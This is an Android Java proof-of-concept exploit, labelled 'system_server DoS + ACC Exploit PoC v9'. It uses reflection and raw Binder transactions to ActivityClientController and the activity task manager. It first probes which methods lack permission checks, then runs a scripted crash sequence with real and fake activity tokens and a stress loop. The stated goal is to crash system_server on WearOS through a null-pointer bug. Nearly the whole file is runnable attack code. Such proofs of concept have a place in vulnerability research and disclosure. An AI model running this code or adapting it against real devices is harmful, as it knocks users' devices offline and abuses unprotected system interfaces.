package com.poc.sysservice;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class SysProbe extends Activity {
    private static final String T = "SYS_PROBE";

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        Log.e(T, "=== system_server DoS + ACC Exploit PoC v9 ===");
        Log.e(T, "UID: " + android.os.Process.myUid());
        Log.e(T, "PID: " + android.os.Process.myPid());

        new Thread(() -> {
            try {
                IBinder acc = getACC();
                if (acc == null) { Log.e(T, "FATAL: no ACC"); return; }
                String accIface = acc.getInterfaceDescriptor();
                IBinder token = getActivityToken();
                IBinder fake = new Binder();
                Log.e(T, "[+] ACC: " + accIface);
                Log.e(T, "[+] Token: " + token);

                // === PROOF: 49/50 methods accessible ===
                Log.e(T, "\n====== PROOF: ACC 49/50 methods no perm ======");
                int ok = 0, perm = 0;
                for (int txn = 1; txn <= 50; txn++) {
                    Parcel d = Parcel.obtain(), r = Parcel.obtain();
                    try {
                        d.writeInterfaceToken(accIface);
                        if (acc.transact(txn, d, r, 0)) {
                            try { r.readException(); ok++; }
                            catch (SecurityException se) { perm++; }
                            catch (Exception e) { ok++; }
                        }
                    } catch (Exception e) {} finally { d.recycle(); r.recycle(); }
                }
                Log.e(T, "[PROVEN] " + ok + "/50 accessible, " + perm + " blocked");

                // === PROOF: isTopOfTask with real token ===
                Parcel d = Parcel.obtain(), r = Parcel.obtain();
                d.writeInterfaceToken(accIface);
                d.writeStrongBinder(token);
                acc.transact(15, d, r, 0);
                r.readException();
                Log.e(T, "[PROVEN] isTopOfTask = " + (r.readInt() != 0));
                d.recycle(); r.recycle();

                // === CRASH SEQUENCE (replicating v7) ===
                Log.e(T, "\n====== CRASH SEQUENCE START ======");

                // Step 1: moveActivityTaskToBack
                d = Parcel.obtain(); r = Parcel.obtain();
                d.writeInterfaceToken(accIface);
                d.writeStrongBinder(token);
                d.writeInt(0);
                try { acc.transact(9, d, r, 0); r.readException(); } catch (Exception e) {}
                d.recycle(); r.recycle();
                Log.e(T, "[+] moveActivityTaskToBack done");

                // Step 2: ATM moveTaskToBack
                IBinder atm = getService("activity_task");
                ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
                List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(10);
                for (ActivityManager.RunningTaskInfo task : tasks) {
                    d = Parcel.obtain(); r = Parcel.obtain();
                    d.writeInterfaceToken("android.app.IActivityTaskManager");
                    d.writeInt(task.taskId);
                    try { atm.transact(42, d, r, 0); r.readException(); } catch (Exception e) {}
                    d.recycle(); r.recycle();
                }
                Log.e(T, "[+] ATM moveTaskToBack done for " + tasks.size() + " tasks");

                // Step 3: enterPictureInPictureMode
                d = Parcel.obtain(); r = Parcel.obtain();
                d.writeInterfaceToken(accIface);
                d.writeStrongBinder(token);
                d.writeInt(0); // null params
                try { acc.transact(13, d, r, 0); r.readException(); } catch (Exception e) {}
                d.recycle(); r.recycle();
                Log.e(T, "[+] enterPiP done");

                // Step 4: toggleFreeformWindowingMode
                d = Parcel.obtain(); r = Parcel.obtain();
                d.writeInterfaceToken(accIface);
                d.writeStrongBinder(token);
                try { acc.transact(16, d, r, 0); r.readException(); } catch (Exception e) {}
                d.recycle(); r.recycle();
                Log.e(T, "[+] toggleFreeform done");

                // Step 5: navigateUpTo
                Intent upIntent = new Intent();
                upIntent.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings"));
                upIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                d = Parcel.obtain(); r = Parcel.obtain();
                d.writeInterfaceToken(accIface);
                d.writeStrongBinder(token);
                d.writeInt(1);
                upIntent.writeToParcel(d, 0);
                d.writeInt(0);
                d.writeInt(0);
                try { acc.transact(11, d, r, 0); r.readException(); } catch (Exception e) {}
                d.recycle(); r.recycle();
                Log.e(T, "[+] navigateUpTo done");

                // Step 6: All 50 methods with real token
                for (int txn = 1; txn <= 50; txn++) {
                    d = Parcel.obtain(); r = Parcel.obtain();
                    d.writeInterfaceToken(accIface);
                    d.writeStrongBinder(token);
                    try { acc.transact(txn, d, r, 0); r.readException(); } catch (Exception e) {}
                    d.recycle(); r.recycle();
                }
                Log.e(T, "[+] All 50 ACC methods with real token done");

                // Step 7: Lifecycle calls with fake token
                for (int txn : new int[]{4, 5, 6, 38, 40}) {
                    d = Parcel.obtain(); r = Parcel.obtain();
                    d.writeInterfaceToken(accIface);
                    d.writeStrongBinder(fake);
                    d.writeInt(0); d.writeInt(0); d.writeInt(0);
                    try { acc.transact(txn, d, r, 0); r.readException(); } catch (Exception e) {}
                    d.recycle(); r.recycle();
                }
                Log.e(T, "[+] Fake token lifecycle calls done");

                // Step 8: Stress test 3 rounds
                for (int round = 0; round < 3; round++) {
                    for (int txn = 1; txn <= 50; txn++) {
                        d = Parcel.obtain(); r = Parcel.obtain();
                        try {
                            d.writeInterfaceToken(accIface);
                            d.writeStrongBinder(fake);
                            d.writeStrongBinder(fake);
                            d.writeInt(0); d.writeInt(0);
                            acc.transact(txn, d, r, 0);
                            try { r.readException(); } catch (Exception e) {}
                        } catch (android.os.DeadObjectException e) {
                            Log.e(T, "[!!!] DEAD OBJECT at round=" + round + " txn=" + txn);
                            Log.e(T, "[!!!] system_server CRASHED during stress test!");
                            return;
                        } catch (Exception e) {} finally { d.recycle(); r.recycle(); }
                    }
                }
                Log.e(T, "[+] Stress test 3x50 done");

                Log.e(T, "\n====== CRASH SEQUENCE COMPLETE ======");
                Log.e(T, "[INFO] If system_server crashes, it typically happens 30-60s after");
                Log.e(T, "[INFO] The crash is in ListenerManager.findRemoteObserverWrapperLocked");
                Log.e(T, "[INFO] It is a WearOS-specific NPE triggered by ACC method calls");
                Log.e(T, "=== PoC v9 DONE ===");

            } catch (Exception e) {
                Log.e(T, "FATAL: " + e);
            }
        }).start();
    }

    private IBinder getService(String name) {
        try {
            return (IBinder) Class.forName("android.os.ServiceManager")
                .getMethod("getService", String.class).invoke(null, name);
        } catch (Exception e) { return null; }
    }

    private IBinder getACC() throws Exception {
        IBinder atm = getService("activity_task");
        Parcel d = Parcel.obtain(), r = Parcel.obtain();
        try {
            d.writeInterfaceToken("android.app.IActivityTaskManager");
            atm.transact(16, d, r, 0);
            r.readException();
            return r.readStrongBinder();
        } finally { d.recycle(); r.recycle(); }
    }

    private IBinder getActivityToken() {
        try {
            Field f = Activity.class.getDeclaredField("mToken");
            f.setAccessible(true);
            return (IBinder) f.get(this);
        } catch (Exception e) { return null; }
    }
}
